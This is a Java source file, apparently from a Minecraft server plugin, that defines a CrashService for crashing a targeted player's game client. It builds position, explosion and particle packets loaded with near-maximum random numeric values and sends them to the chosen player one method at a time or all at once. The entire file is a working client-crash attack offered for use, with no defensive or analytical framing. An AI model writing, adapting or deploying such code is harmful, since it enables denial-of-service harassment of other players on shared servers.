package com.deathmotion.playercrasher.services;

import com.deathmotion.playercrasher.enums.CrashMethod;
import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.protocol.particle.Particle;
import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerParticle;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
import lombok.NonNull;
import org.bukkit.entity.Player;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.function.Consumer;

/**
 * Service responsible for handling crashes.
 */
public class CrashService {
    private static final Random RANDOM = new Random();

    private final WrapperPlayServerPlayerPositionAndLook positionPacket;
    private final WrapperPlayServerExplosion explosionPacket;
    private final WrapperPlayServerParticle particlePacket;

    private Map<CrashMethod, Consumer<Player>> crashMethodActions;

    /**
     * The constructor initializes the crash method actions and packets.
     */
    public CrashService() {
        this.initCrashMethodActions();

        this.positionPacket = initPositionPacket();
        this.explosionPacket = initExplosionPacket();
        this.particlePacket = initParticlePacket();
    }

    private double d() {
        double lowerBound = RANDOM.nextDouble() * 0.1 + 0.4;
        return RANDOM.nextDouble() * (Double.MAX_VALUE * (1 - lowerBound)) + Double.MAX_VALUE * RANDOM.nextDouble() * 0.1 + 0.4;
    }

    private float f() {
        float lowerBound = RANDOM.nextFloat() * 0.1f + 0.4f;
        return RANDOM.nextFloat() * (Float.MAX_VALUE * (1 - lowerBound)) + Float.MAX_VALUE * RANDOM.nextFloat() * 0.1f + 0.4f;
    }

    private byte b() {
        double lowerBound = RANDOM.nextDouble() * 0.1 + 0.4;
        return (byte) (RANDOM.nextInt((int) (Byte.MAX_VALUE * (1 - lowerBound))) + Byte.MAX_VALUE * lowerBound);
    }

    private int i() {
        double lowerBound = RANDOM.nextDouble() * 0.1 + 0.4;
        return RANDOM.nextInt((int) (Integer.MAX_VALUE * (1 - lowerBound))) + (int) (Integer.MAX_VALUE * lowerBound);
    }

    /**
     * Crashes the targeted player using the specified method.
     *
     * @param target the player to be crashed
     * @param method the crash method to be used
     */
    public void crashPlayer(@NonNull Player target, @NonNull CrashMethod method) {
        if (method == CrashMethod.ALL) {
            for (Consumer<Player> action : crashMethodActions.values()) {
                action.accept(target);
            }
        } else {
            Consumer<Player> action = crashMethodActions.get(method);
            action.accept(target);
        }
    }

    /**
     * Sends a position packet to the targeted player.
     *
     * @param target the player to receive the packet
     */
    private void sendPositionPacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, positionPacket);
    }

    /**
     * Sends an explosion packet to the targeted player.
     *
     * @param target the player to receive the packet
     */
    private void sendExplosionPacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, explosionPacket);
    }

    /**
     * Sends a particle packet to the targeted player.
     *
     * @param target the player to receive the packet
     */
    private void sendParticlePacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, particlePacket);
    }

    /**
     * Initializes actions for each crash method.
     */
    private void initCrashMethodActions() {
        this.crashMethodActions = new HashMap<>();
        this.crashMethodActions.put(CrashMethod.POSITION, this::sendPositionPacket);
        this.crashMethodActions.put(CrashMethod.EXPLOSION, this::sendExplosionPacket);
        this.crashMethodActions.put(CrashMethod.PARTICLE, this::sendParticlePacket);
    }

    /**
     * @return a new PlayerPositionAndLook packet with invalid values.
     */
    private WrapperPlayServerPlayerPositionAndLook initPositionPacket() {
        return new WrapperPlayServerPlayerPositionAndLook(d(), d(), d(), f(), f(), b(), i(), false);
    }

    /**
     * @return a new Explosion packet with invalid values.
     */
    private WrapperPlayServerExplosion initExplosionPacket() {
        return new WrapperPlayServerExplosion(new Vector3d(d(), d(), d()), f(), Collections.emptyList(), new Vector3f(f(), f(), f()));
    }

    /**
     * @return a new Particle packet with invalid values.
     */
    private WrapperPlayServerParticle initParticlePacket() {
        return new WrapperPlayServerParticle(new Particle(ParticleTypes.DRAGON_BREATH), true, new Vector3d(d(), d(), d()), new Vector3f(f(), f(), f()), f(), i());
    }
}